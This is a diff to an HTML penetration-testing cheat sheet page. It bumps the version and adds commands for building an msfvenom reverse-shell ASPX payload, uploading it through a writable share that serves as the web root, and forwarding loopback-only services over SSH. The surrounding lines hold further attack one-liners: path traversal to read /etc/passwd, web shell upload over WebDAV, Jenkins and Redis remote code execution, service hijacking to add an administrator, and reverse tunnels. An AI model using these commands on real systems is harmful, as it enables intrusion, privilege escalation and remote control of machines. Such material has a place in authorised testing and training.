@@ -100,7 +100,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.5.0</span>
+  <span class="ver">v1.5.1</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -191,6 +191,8 @@ curl --path-as-is &quot;http://$IP/../../../../etc/passwd&quot;   # curl strips 
 # GraphQL introspection:  POST /graphql {&quot;query&quot;:&quot;{__schema{types{name fields{name}}}}&quot;}   (InQL, graphw00f)
 # Deserialization: Java ysoserial | .NET ysoserial.net ViewState | Python pickle | Node node-serialize
 # WebDAV:  davtest -url http://&lt;ip&gt;   ;  curl -T shell.php http://&lt;ip&gt;/   (upload .txt then MOVE if filtered)
+# writable SMB/FTP share that IS the web root: put shell, then curl it. IIS runs .aspx, Apache .php
+#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
 # Jenkins /script (Groovy):  println &#x27;id&#x27;.execute().text
 # Redis unauth -&gt; SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x &#x27;&lt;pubkey&gt;&#x27; ; save
 # Redis as root, nothing to key? module RCE:  module load /tmp/module.so ; system.exec &#x27;id&#x27;   (RedisModules-ExecuteCommand)
@@ -371,6 +373,8 @@ accesschk.exe -uwcqv &lt;user&gt; *                 # services you may reconfigu
 sc config &lt;svc&gt; binpath= &quot;cmd /c net localgroup administrators &lt;user&gt; /add&quot; &amp;&amp; sc start &lt;svc&gt;
 #   Server Operators group members can do the above to any service = SYSTEM, no file dropped
 # open Squid proxy (3128/8080)? that is a free tunnel - proxychains conf:  http &lt;ip&gt; 3128
+ss -tulpn                                      # then forward anything bound to 127.0.0.1 only
+ssh -L 3306:127.0.0.1:3306 &lt;user&gt;@$IP          # loopback services are usually unauthenticated
 # Windows foothold, no sshd? dial out instead - it ships an OpenSSH *client*:
 ssh -R 1080 -N &lt;user&gt;@$LHOST                   # older boxes: plink.exe -ssh -l &lt;u&gt; -pw &lt;p&gt; -R 1080 $LHOST
 netsh interface portproxy add v4tov4 listenport=9999 connectaddress=&lt;internal&gt; connectport=3389   # admin, no upload</code></pre></div>
